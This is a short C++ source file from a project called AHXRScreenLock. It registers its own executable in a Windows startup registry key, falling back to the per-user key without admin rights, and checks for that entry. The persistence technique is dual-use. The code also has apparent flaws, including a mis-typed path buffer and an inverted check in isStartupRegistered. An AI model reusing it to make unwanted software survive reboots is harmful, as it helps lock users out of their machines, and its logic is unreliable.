/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include							"stdafx.h"
#include							"payload_startup.h"
#include							<Windows.h>
#include							<string>
#include							<iostream>

void createStartupData() {

	HKEY h_key;
	long l_key;

	l_key = RegOpenKeyEx(KEY_TARGET, KEY_STARTUP, 0, KEY_ALL_ACCESS, &h_key);

	// No admin access. Just make it user startup.
	if (l_key == ERROR_ACCESS_DENIED)
		l_key = RegOpenKeyEx(KEY_NON_ADMIN_TARGET, KEY_NON_ADMIN_STARTUP, 0, KEY_ALL_ACCESS, &h_key);
	
	if (l_key == ERROR_SUCCESS) {

		HMODULE h_mod = GetModuleHandleW(NULL);
		char * c_path[MAX_PATH];
		GetModuleFileNameA(h_mod, (char *)c_path, MAX_PATH);

		RegSetValueEx(h_key, KEY_VALUE_NAME, 0, REG_SZ, (LPBYTE)c_path, MAX_PATH);
		RegCloseKey(h_key);
	}

}

bool isStartupRegistered() {
	HKEY h_key;
	long l_key;
	bool b_exist;

	l_key = RegOpenKeyEx(KEY_TARGET, KEY_STARTUP, 0, KEY_READ, &h_key);
	// No admin access. Just make it user startup.
	if (l_key == ERROR_ACCESS_DENIED)
		l_key = RegOpenKeyEx(KEY_NON_ADMIN_TARGET, KEY_NON_ADMIN_STARTUP, 0, KEY_READ, &h_key);

	char c_data[MAX_PATH];
	DWORD dw_reg = REG_SZ;
	DWORD dw_length = MAX_PATH;
	LONG l_error = RegQueryValueEx(h_key, KEY_VALUE_NAME, NULL, &dw_reg, (LPBYTE)&c_data, &dw_length);
	
	b_exist = ( l_error == ERROR_FILE_NOT_FOUND );
	RegCloseKey(h_key);

	return b_exist;
}
